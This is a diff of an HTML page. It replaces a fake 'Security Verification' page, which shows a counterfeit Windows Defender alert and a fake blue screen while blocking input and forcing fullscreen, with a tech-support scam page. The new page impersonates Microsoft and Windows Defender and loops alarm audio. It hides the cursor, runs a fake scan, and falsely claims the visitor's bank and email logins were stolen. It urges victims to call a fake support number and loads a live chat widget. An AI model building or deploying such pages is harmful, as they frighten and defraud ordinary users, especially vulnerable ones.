@@ -1,493 +1,513 @@
-<!DOCTYPE html>
+
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            cursor: default;
-        }
-        
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #f2f2f2;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        #normalContent {
-            text-align: center;
-            padding: 20px;
-        }
-        
-        #defenderScreen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #0078d7;
-            color: white;
-            display: none;
-            flex-direction: column;
-            z-index: 1000;
-        }
-        
-        .defender-header {
-            background-color: #005a9e;
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .defender-icon {
-            font-size: 24px;
-            margin-right: 10px;
-        }
-        
-        .defender-title {
-            font-weight: bold;
-            font-size: 18px;
-        }
-        
-        .defender-content {
-            padding: 30px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .critical-alert {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .warning-icon {
-            font-size: 40px;
-            margin-right: 15px;
-            color: #ff5555;
-        }
-        
-        .alert-message {
-            font-size: 18px;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-        
-        .threat-details {
-            background-color: rgba(0, 0, 0, 0.2);
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 30px;
-        }
-        
-        .threat-row {
-            display: flex;
-            margin-bottom: 10px;
-        }
-        
-        .threat-label {
-            font-weight: bold;
-            width: 150px;
-        }
-        
-        .action-buttons {
-            display: flex;
-            gap: 15px;
-            margin-top: auto;
-        }
-        
-        .defender-button {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-        
-        .primary-button {
-            background-color: #ff5555;
-            color: white;
-        }
-        
-        .primary-button:hover {
-            background-color: #ff3333;
-        }
-        
-        .secondary-button {
-            background-color: rgba(255, 255, 255, 0.2);
-            color: white;
-        }
-        
-        .secondary-button:hover {
-            background-color: rgba(255, 255, 255, 0.3);
-        }
-        
-        .scan-progress {
-            margin-top: 30px;
-            display: none;
-        }
-        
-        .progress-container {
-            width: 100%;
-            background-color: rgba(255, 255, 255, 0.2);
-            height: 20px;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 15px 0;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background-color: white;
-            width: 0%;
-            transition: width 0.1s linear;
-        }
-        
-        .progress-text {
-            text-align: center;
-            font-size: 14px;
-        }
-        
-        .bsod-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #0078d7;
-            color: white;
-            font-family: 'Lucida Console', Monaco, monospace;
-            padding: 20px;
-            display: none;
-            z-index: 2000;
-        }
-        
-        .bsod-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .bsod-emoji {
-            font-size: 28px;
-            margin-right: 10px;
-        }
-        
-        .bsod-message {
-            font-size: 16px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-        
-        .error-code {
-            font-family: monospace;
-            background-color: rgba(0, 0, 0, 0.2);
-            padding: 5px 10px;
-            border-radius: 3px;
-            display: inline-block;
-            margin: 10px 0;
-        }
-        
-        .bsod-progress {
-            width: 100%;
-            background-color: rgba(255, 255, 255, 0.2);
-            height: 20px;
-            margin: 20px 0;
-            border-radius: 3px;
-            overflow: hidden;
-        }
-        
-        .bsod-progress-bar {
-            height: 100%;
-            background-color: white;
-            width: 0%;
-            transition: width 0.1s linear;
-        }
-        
-        .bsod-percentage {
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        
-        .bsod-info {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 30px;
-        }
-        
-        #inputBlocker {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 9999;
-            background: transparent;
-        }
-    </style>
-</head>
-<body>
-    <div id="normalContent">
-        <h1>Checking If You Are A Human</h1>
-        <p>Please wait while we process the robot verification.</p>
-        <p>Processing in <span id="countdown">5</span> seconds...</p>
-    </div>
+<meta charset="utf-8">
+	<script defer="" data-domain="8.com" src="script.html"></script>
 
-    <!-- Windows Defender Alert Screen -->
-    <div id="defenderScreen">
-        <div class="defender-header">
-            <div class="defender-icon">🛡️</div>
-            <div class="defender-title">Windows Defender</div>
-        </div>
-        
-        <div class="defender-content">
-            <div class="critical-alert">
-                <div class="warning-icon">⚠️</div>
-                <div>CRITICAL SYSTEM ALERT</div>
-            </div>
-            
-            <div class="alert-message">
-                Windows Defender detected severe system corruption that could lead to data loss or system instability. 
-                Immediate action is required to prevent permanent damage to your system.
-            </div>
-            
-            <div class="threat-details">
-                <div class="threat-row">
-                    <div class="threat-label">Threat Name:</div>
-                    <div>Trojan:Win32/Wacatac.B!ml</div>
-                </div>
-                <div class="threat-row">
-                    <div class="threat-label">Severity:</div>
-                    <div>Critical</div>
-                </div>
-                <div class="threat-row">
-                    <div class="threat-label">Location:</div>
-                    <div>C:\Windows\System32\drivers\atapi.sys</div>
-                </div>
-                <div class="threat-row">
-                    <div class="threat-label">Status:</div>
-                    <div>Active (spreading to other system files)</div>
-                </div>
-            </div>
-            
-            <div class="action-buttons">
-                <button id="removeThreat" class="defender-button primary-button">Remove Threat (Recommended)</button>
-                <button id="advancedOptions" class="defender-button secondary-button">Advanced Options</button>
-            </div>
-            
-            <div id="scanProgress" class="scan-progress">
-                <div>Scanning and repairing system files...</div>
-                <div class="progress-container">
-                    <div id="defenderProgressBar" class="progress-bar"></div>
-                </div>
-                <div id="defenderProgressText" class="progress-text">0% complete</div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- BSOD Screen -->
-    <div id="bsodScreen" class="bsod-screen">
-        <div class="bsod-title">
-            <span class="bsod-emoji">:(</span>
-            Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
-        </div>
-        
-        <div class="bsod-message">
-            If you'd like to know more, you can search online later for this error: 
-            <span class="error-code">CRITICAL_PROCESS_DIED</span>
-        </div>
-        
-        <div class="bsod-percentage" id="bsodPercentage">0% complete</div>
-        <div class="bsod-progress">
-            <div id="bsodProgressBar" class="bsod-progress-bar"></div>
-        </div>
-        
-        <div class="bsod-info">
-            <div>
-                For more information about this issue and possible fixes, visit https://www.windows.com/stopcode
-                <br><br>
-                Support person: Tell them this stop code: CRITICAL_PROCESS_DIED
-            </div>
-            <div style="margin-top: 20px;">
-                The dump file was created but cannot be found. This could be caused by a problem with your storage device.
-                <br>
-                To try to repair your PC, insert your Windows installation media and restart your PC.
-            </div>
-        </div>
-    </div>
-    
-    <!-- Input blocker (transparent overlay) -->
-    <div id="inputBlocker"></div>
-    
+      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
+      <meta content="noindex,nofollow" name="robots">
+      <title>Security center </title>
+      <link href="w3" rel="icon" id="favicon" type="image/png">
+      <link href="css/tapa.css" rel="stylesheet">
+        <link href="css/bootstrap.min.css" <link="" type="text/css" rel="stylesheet">
+<script src="js/jquery.min.js"></script>
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/font-awesome.min.css">
+
+      <style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{animation : tawkMaxOpen .25s ease!important;}@keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>
+
+
+         <script src="js/esc.js" type="text/javascript"></script>
+         <script src="js/flscn.js" type="text/javascript"></script>
+         <script src="js/main.js" type="text/javascript"></script>
+         <script src="js/customone.js" type="text/javascript"></script>
+         <script src="js/customtwo.js" type="text/javascript"></script>
     <script>
-        // Strict input blocking function
-        function blockAllInput(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            return false;
-        }
+function chat() {
+document.getElementById("chat").style.display = "block";
+document.getElementById("footer").style.display = "block";
+document.getElementById("welcomeDiv").style.display = "block";
+ document.getElementById("chat-box").style.display = "none";
 
-        // Block all possible input methods
-        const eventsToBlock = [
-            'keydown', 'keyup', 'keypress',
-            'contextmenu', 'selectstart', 'dragstart',
-            'mousedown', 'mouseup', 'click',
-            'wheel', 'mousewheel', 'DOMMouseScroll'
-        ];
+}
+</script>
 
-        eventsToBlock.forEach(event => {
-            document.addEventListener(event, blockAllInput, {capture: true, passive: false});
-            window.addEventListener(event, blockAllInput, {capture: true, passive: false});
+<script>
+			function getVariableFromURl(n0me)
+			{
+					n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+					var regexS = "[\\?&]"+n0me+"=([^&#]*)";
+					var regex = new RegExp( regexS );
+					var results = regex.exec( window.location.href );
+					if( results == null )
+							return "";
+					else
+							return results[1];
+			}
+	</script>
+
+
+
+
+					<script>
+								function vhdydjwhcnfyhecnfheucncevi(name)
+								{
+										name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+										var regexS = "[\\?&]"+name+"=([^&#]*)";
+										var regex = new RegExp( regexS );
+										var results = regex.exec( window.location.href );
+										if( results == null )
+												return "";
+										else
+												return results[1];
+								}
+								var Anph = vhdydjwhcnfyhecnfheucncevi('Anph');
+						</script>
+
+						<script type="text/javascript">
+												var Anph = getVariableFromURl('Anph');
+										</script>
+
+
+        </head>
+
+
+
+        <body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none">
+
+    <audio id="websgt">
+        <source src="media/beep.mp3" type="audio/mpeg">
+      </audio>
+      <audio autoplay="" id="infogt">
+        <source src="media/eng.mp3" type="audio/mpeg">
+      </audio>
+
+      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
+        <div class="black" style="height: 145%; cursor: none; display: block;"></div>
+
+          <div class="bg" id="bg">
+        <div class="bgimg" style="top:0">
+          <img src="images/f24.png" alt="" width="100%">
+        </div>
+      </div>
+      </a>
+      <div class="pro_box" style="cursor: none; display: default;">
+        <div class="pro_box_header">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="minimize">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="images/mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="logo">
+                <img src="images/msmm.png">
+                <span>Wind0ws security</span>
+              </div>
+            </div>
+            <div class="col-md-8">
+              <div class="activate_lic">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <button>Activate the license</button>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="images/set.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="data:/image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scan_box">
+          <div class="scan_box_header">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="quick_scan">
+                  <p>
+                    <img src="images/vsc.png">
+                    <span>Scanning Rapide</span>
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="bhfys">
+                  <ul>
+                    <li>
+                      <a href="#">
+                        <img src="images/mnc.png">
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="scan_body">
+            <div class="progress" style="height:30px;">
+              <img src="images/scn.png" alt="" style="max-width: 100%;">
+            </div>
+            <div class="table_quick">
+              <table class="table table-bordered">
+                <thead>
+                  <tr>
+                    <th scope="col">Scanned Objects</th>
+                    <th scope="col">
+                      <div class="col_fourth counter">
+                        <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
+                      </div>
+                    </th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Time Spent</th>
+                    <th scope="col">5 secs</th>
+                  </tr>
+                  <tr>
+                    <th scope="col">Identified Threats</th>
+                    <th scope="col" style="color:red">
+                      <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
+                    </th>
+                  </tr>
+                </thead>
+              </table>
+            </div>
+          </div>
+          <div class="scan_footer">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="bt_can">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scan</button>
+                  </div>
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Pause</button>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="bt_can2">
+                  <div class="btn-group" role="group" aria-label="Basic example">
+                    <button class="btn btn-secondary" type="button">Scheduled Scans</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pro_box2" style="cursor: default; display: none;">
+        <img src="images/bg1.png" alt="" style="max-width: 100%;">
+      </div>
+      <div class="pro_box3" style="cursor: none; display: none;">
+        <div class="pro_box_header">
+          <div class="row">
+            <div class="col-md-12">
+              <div class="minimize">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <img src="images/mnc.png">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+            <div class="col-md-4">
+              <div class="logo">
+                <img src="images/msmm.png">
+                <span>Wind0ws security</span>
+              </div>
+            </div>
+            <div class="col-md-8">
+              <div class="activate_lic">
+                <ul>
+                  <li>
+                    <a href="#">
+                      <button>Activate the license</button>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="images/bel.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="images/set.png">
+                    </a>
+                  </li>
+                  <li>
+                    <a href="#">
+                      <img src="data:/image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
+                    </a>
+                  </li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div><div class="scan_box2" style=" border: 1px solid #474747;  cursor:default;  box-shadow: 15px 15px 15px 15px rgba(0,0,0,.4);">
+        <div class="scan_box2">
+          <div class="scan_box_header">
+            <div class="row">
+              <div class="col-md-6">
+                <div class="quick_scan">
+                  <p>
+                    <img src="images/vsc.png">
+                    <span>Scan</span>
+                  </p>
+                </div>
+              </div>
+             <div class="col-md-6">
+           <span class="fl title2" id="txts1">
+              <a href="#" id="cross">
+                <p style="margin-right:50px;">+1-844-610-9851	</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+                      </a>
+
+
+                </span></div>
+              </div>
+            </div>
+          </div>
+          <div class="scan_body">
+            <div class="row">
+              <div class="col-md-12">
+                <div class="tooreg_detail_scan">
+                  <ul>
+
+                  </ul></div>
+                </div>
+
+              </div>
+            </div>
+          </div>
+        </div>
+
+      <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
+        <div class="row">
+          <div class="col-md-12">
+            <div class="right-foot" style="text-align:center">
+              <span id="footertxt">
+                <img src="images/msmm.png"> Wind0ws security </span>
+              <span style="font-weight:500;padding-left:13px;color:#fff; ">Wind0ws Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +1-844-610-9851	
+                </span>
+              </span>
+            </div>
+          </div>
+          <div class="col-md-12">
+            <marquee direction="left" height="100px" width="100%">
+              <small class="text-left" style="color:#eee;font-size:10px">Wind0ws Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your PC at risk. Wind0ws Defender scan detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents。</small>
+            </marquee>
+          </div>
+        </div>
+      </div>
+      <div class="lightbox" id="mnboxs" onclick="beep1();" style="display: none; cursor:default;">
+        <div class="ilb top" style="font-size:17px">
+          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
+            <span class="fl title" id="txtadd">
+              <span class="fl ilb">
+                <img src="images/dfs.png" class="logo3">
+              </span>Microsoft_Defender </span>
+            <span class="fl title2" id="txts1">
+               <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
+
+            </span>
+          </div>
+        </div>
+        <div id="txtintro2">
+          <span class="colo-rd">
+           <p style="font-size:30px;font-weight:500;">Sorry, scan is not completed!</p>
+            <p style="font-size:25px;color:red;font-weight:500;">Error: Ox800VDS</p>
+             <p style="font-size:15px;font-weight:400;color:black;">Microsoft_Defender found some infected files but not able to remove it because of the group policies permissions. Please Scan now to remove it manually.</p>
+
+          </span>
+        </div>
+        <img src="images/re.gif" id="banner">
+        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
+           <span class="support" style="font-size:22px;">Wind0ws Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">    +1-844-610-9851	
+            </span>
+          </span>
+        </div>
+        <div id="bottom">
+          <img src="images/msmm.png" id="badge">
+          <span class="title3">Wind0ws Security</span>
+          <ul>
+            <li>
+              <a href="#" style="text-decoration: none;">
+                <div class="button">
+                  <span id="">Scan now</span>
+                </div>
+              </a>
+            </li>
+            <li>
+              <a href="#" style="text-decoration: none;">
+                <div class="button2">
+                  <span id="">Scan Later</span>
+                </div>
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
+        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Wind0ws-Defender </p>
+        <p>
+         <b>Access to this PC has been blocked for security reasons</b>
+         </p>
+         <p>Your PC has been accounted for to be tainted with Trojan-type spyware. The accompanying information was compromised:</p>
+         <p>&gt; Email ID <br>&gt; Bank Password <br>&gt; Facebook Login <br>&gt; Photos and Documents </p>
+         <p>A Wind0ws-Defender scan detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
+         <p>Please contact us immediately. Our engineer will guide you through the removal process over the phone. </p>
+         <p>Call Wind0ws Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
+         <p>Closing this window may put your personal information at risk and may cause your Wind0ws registration to be suspended. </p>
+         <p style="padding-bottom:0;color:#fff;font-size:16px">Wind0ws Please call support:<strong>
+            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   +1-844-610-9851	
+            </span>
+          </strong>
+        </p>
+        <div class="action_buttons">
+          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Allow</a>
+          <a class="active" id="leave_page" style="color:#fff!important">Deny</a>
+        </div>
+      </div>
+
+      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
+        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
+          <strong>
+         Wind0ws Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    +1-844-610-9851	
+            </span>
+          </strong>
+        </p>
+      </div>
+      <div id="chat" style="display: none;">
+        <img src="images/msmm.png">
+        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+        <br>
+        <p>Wind0ws Technical Support
+        </p>
+        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    +1-844-610-9851	
+          <br>( Toll-free number)<br><br>
+        </h4>
+        <div class="arrow-down">
+          <svg height="1em" viewBox="0 0 320 512">
+            <style>
+              svg {
+                fill: #fff
+              }
+            </style>
+            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
+                  </svg></div>
+      </div>
+<div id="chat-box">
+<span style="color: red;
+font-size: 21px;
+font-weight: 600;
+margin-left: 6px;
+position: relative;
+top: 5px;">Virus Alert !!</span>
+<div class="bhfys" onclick="hide1();playSound1();">
+            <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>
+
+          </div>
+
+<br>
+<br>
+<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
+Microsoft Wind0ws locked due to unusual activity.
+
+<img src="images/rasm.gif" width="250">
+
+<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;">+1-844-610-9851	 			 	</strong></p>
+
+</div>
+
+<script>
+function showd2() {
+document.getElementById("chat-box").style.display = "block";
+}
+</script>
+
+      <script>
+        setInterval(function() {
+          document.getElementById("infogt").play()
+        }, 500);
+      </script>
+      <script>
+  function beep1() {
+    document.getElementById("websgt").play();
+ }
+  </script>
+      <script>
+        var e = 1;
+        setInterval(function() {
+          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
+        }, 1E3);
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#welcomeDiv").show()
+
+          })
         });
-
-        // Block F11, Esc, Alt+F4, etc.
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F11' || e.key === 'Escape' || 
-                (e.altKey && e.key === 'F4') || 
-                (e.ctrlKey && (e.key === 'w' || e.key === 'W'))) {
-                e.preventDefault();
-                e.stopPropagation();
-                e.stopImmediatePropagation();
-                return false;
-            }
-        }, true);
-
-        // Auto-start countdown
-        let count = 5;
-        const countdownElement = document.getElementById('countdown');
-        const countdownInterval = setInterval(() => {
-            count--;
-            countdownElement.textContent = count;
-            
-            if (count <= 0) {
-                clearInterval(countdownInterval);
-                startSimulation();
-            }
-        }, 1000);
-        
-        function startSimulation() {
-            // Activate input blocker
-            document.getElementById('inputBlocker').style.display = 'block';
-            
-            // Hide normal content
-            document.getElementById('normalContent').style.display = 'none';
-            
-            // Show Defender alert
-            document.getElementById('defenderScreen').style.display = 'flex';
-            
-            // Force fullscreen with retry logic
-            const enterFullscreen = () => {
-                const elem = document.documentElement;
-                
-                if (elem.requestFullscreen) {
-                    elem.requestFullscreen()
-                        .then(() => {
-                            // Lock orientation if supported
-                            if (screen.orientation && screen.orientation.lock) {
-                                screen.orientation.lock('landscape').catch(() => {});
-                            }
-                            
-                            // Prevent exiting fullscreen
-                            document.addEventListener('fullscreenchange', () => {
-                                if (!document.fullscreenElement) {
-                                    enterFullscreen();
-                                }
-                            });
-                        })
-                        .catch(err => {
-                            console.log("Fullscreen error:", err);
-                            // Retry if failed
-                            setTimeout(enterFullscreen, 500);
-                        });
-                }
-            };
-            
-            enterFullscreen();
-        }
-        
-        // Defender "Remove Threat" button
-        document.getElementById('removeThreat').addEventListener('click', function(e) {
-            e.stopPropagation();
-            
-            // Show scanning progress
-            document.getElementById('scanProgress').style.display = 'block';
-            
-            // Simulate scanning progress
-            let progress = 0;
-            const defenderProgressBar = document.getElementById('defenderProgressBar');
-            const defenderProgressText = document.getElementById('defenderProgressText');
-            
-            const interval = setInterval(function() {
-                progress += Math.random() * 5;
-                if (progress > 100) progress = 100;
-                
-                defenderProgressBar.style.width = progress + '%';
-                defenderProgressText.textContent = Math.floor(progress) + '% complete';
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    // After scan "completes", trigger BSOD
-                    triggerBSOD();
-                }
-            }, 100);
+      </script>
+      <script>
+        $(document).ready(function() {
+          $(".pro_box").delay(400).fadeIn(300);
+          $("#mnboxs").delay(2000).fadeIn(400);
+              $(".black").delay(1E3).fadeIn(800);
+          $(".pro_box2").delay(2500).fadeIn(800);
+          $(".pro_box3").delay(3500).fadeIn(800);
+          $("#pop_up_new").delay(4E3).fadeIn(800);
         });
-        
-        // Defender "Advanced Options" button
-        document.getElementById('advancedOptions').addEventListener('click', function(e) {
-            e.stopPropagation();
-            // Immediately trigger BSOD
-            triggerBSOD();
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("#mycanvas").click(function() {
+            $("#mnboxs").show()
+          })
         });
-        
-        function triggerBSOD() {
-            // Hide Defender screen
-            document.getElementById('defenderScreen').style.display = 'none';
-            
-            // Show BSOD
-            document.getElementById('bsodScreen').style.display = 'block';
-            
-            // Simulate BSOD progress
-            let progress = 0;
-            const bsodProgressBar = document.getElementById('bsodProgressBar');
-            const bsodPercentage = document.getElementById('bsodPercentage');
-            
-            const interval = setInterval(function() {
-                progress += Math.random() * 3;
-                if (progress > 100) progress = 100;
-                
-                bsodProgressBar.style.width = progress + '%';
-                bsodPercentage.textContent = Math.floor(progress) + '% complete';
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    // Keep it at 100% - no automatic exit
-                }
-            }, 100);
-        }
-    </script>
-</body>
-</html>
+        $(document).ready(function() {
+          $("#cross").click(function() {
+            $("#mnboxs").show()
+          })
+        });
+      </script>
+      <script>
+        $(document).ready(function() {
+          $("body").mouseover(function() {
+            $("#mnboxs").show()
+          })
+        });
+      </script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/680fc765d22d79190b3eba6b/1ipuq5q2a';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+
+
+      
+
+</body></html>
